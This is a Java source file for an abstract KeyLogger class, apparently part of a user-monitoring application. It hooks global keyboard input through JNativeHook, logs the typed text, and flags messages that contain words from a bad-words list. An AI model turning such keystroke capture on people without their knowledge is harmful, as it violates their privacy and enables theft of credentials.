package logger;

import environment.AccessWindow;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import view.AlertBox;
import view.Loginer;
import webService.AWSWebService;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;

public abstract class KeyLogger {

    private InputStream badWordsFilePath = ClassLoader.getSystemResourceAsStream("BadWords.csv");
    private String fileName =  getCurrentTime();
    private InputStream filePath = ClassLoader.getSystemResourceAsStream(fileName);

    public static ArrayList<String> log = new ArrayList<>();


    String message;
    String sendKey;

    AccessWindow accessWindow = new AccessWindow();

    abstract void nativeKeyPressed(NativeKeyEvent event);
    abstract public void turnOn();
    abstract void setDefaults();


    String getCurrentTime() {
        return new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new Date());
    }


    void saveMessage() throws IOException {
        if(checkForBadWords(message)) {
            Loginer.foundBadWord = true;
        }
        writeToFile(message);
    }


    public void turnOff()  {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        try {
            saveMessage();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void writeToFile(String file) {
        System.out.println(file);
        log.add(file + "\n");
        setDefaults();
    }

    private boolean checkForBadWords(String message) {
        ArrayList<String> badWords = getBadWords();
        for (String badWord: badWords) {
            if(message.toUpperCase().contains(badWord.toUpperCase())) {
                return true;
            }
        }
        return false;
    }

    private ArrayList<String> getBadWords () {
        ArrayList<String> badWords = new ArrayList<>();
        Scanner scanner = null;
        scanner = new Scanner(badWordsFilePath);
        if(scanner != null) {
            while (scanner.hasNext()) {
                badWords.add(scanner.nextLine());
                }
            scanner.close();
        }
        return badWords;
    }

    public InputStream getFilePath() {
        return filePath;
    }

    public String getFileName() {
        return fileName;
    }

    public void nativeKeyReleased(NativeKeyEvent e) { }
    public void nativeKeyTyped(NativeKeyEvent e) { }
}
